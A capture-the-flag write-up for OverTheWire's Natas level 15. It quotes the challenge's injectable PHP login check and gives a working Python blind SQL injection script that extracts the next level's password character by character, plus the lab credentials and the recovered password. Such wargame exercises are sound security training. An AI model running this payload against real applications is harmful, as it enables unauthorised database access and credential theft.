# Natas Level 15

## 🧪 Credentials

- **URL**: `http://natas15.natas.labs.overthewire.org`
- **Username**: `natas15`
- **Password**: `SdqIqBsFcz3yotlNYErZSZwblkm0lrvx`

---

## 🖥️ Steps

1. Login to the website.
2. let's see the source. here there are no visible passwords. we need to guess it. i ran `Natas16` to see it a username named this exists which does. so we need to guess the pass. i can edit the query like this `SELECT * from users where username="natas16" AND password LIKE BINARY "%"`.
i ran this and it said a user like this exists. now we need to guess the passwprd. doing it by hand is impossible so i wrote a small python code to ease it.
```
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```
3. here is this python code. it's pretty simple you'll get the idea by looking at it. just one thing `BINARY` makes the search case-senstive.
```
import requests
import string

url = "http://natas15.natas.labs.overthewire.org/"
auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")

chars = string.ascii_letters + string.digits
password = ""

while True:
    found = False
    for c in chars:
        payload = f'natas16" AND password LIKE BINARY "{password + c}%" #'
        params = {"username": payload}

        r = requests.get(url, params=params, auth=auth)

        if "This user exists" in r.text:
            password += c
            print("Found char:", password)
            found = True
            break

    if not found:
        print("Final password =", password)
        break
```
4. after running it a waiting a while you'll get the pass.
```
hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```
---
